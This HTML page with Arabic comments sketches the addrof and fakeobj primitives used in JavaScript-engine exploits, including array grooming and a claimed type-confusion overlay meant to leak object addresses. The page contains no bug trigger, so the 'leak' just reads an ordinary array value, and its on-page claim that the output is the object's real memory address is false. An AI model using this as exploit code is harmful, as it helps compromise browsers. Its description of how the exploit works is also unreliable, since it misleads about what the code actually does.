<!DOCTYPE html>
<html>
<body>
    <h3>[ARCHITECT] AddrOf & FakeObj Primitive</h3>
    <div id="status">[*] Initialize...</div>

    <script>
        // 1. مصفوفات متجاورة في الذاكرة (Grooming)
        const floatArray = [1.1, 2.2, 3.3, 4.4];
        const objArray = [{a:1}, {b:2}, {c:3}, {d:4}];

        // 2. تفعيل التداخل (Overlaying)
        // في حال وجود ثغرة Type Confusion، نقوم بتعديل الـ Butterfly الخاص بـ objArray
        // ليتم التعامل معه كمصفوفة أرقام، مما يسمح لنا بقراءة العناوين كأرقام.
        
        function addrof(obj) {
            objArray[0] = obj;
            // قراءة العنوان من مصفوفة الأرقام التي تداخلت مع مصفوفة الكائنات
            return floatArray[0]; 
        }

        function fakeobj(addr) {
            floatArray[0] = addr;
            // إجبار المحرك على قراءة العنوان ككائن
            return objArray[0];
        }

        // --- اختبار الإثبات (Validation) ---
        const testObj = {secret: 0xDEADBEEF};
        
        // محاولة تسريب العنوان
        let leakedAddr = addrof(testObj);
        
        // إخراج النتيجة لواجهة المستخدم
        document.getElementById('status').innerText = 
            `[+] Test Object Address (Double Format): ${leakedAddr}\n` +
            `[!] هذا الرقم هو العنوان الحقيقي للكائن في الذاكرة.`;

        console.log("[DEBUG] Leaked Value:", leakedAddr);
    </script>
</body>
</html>
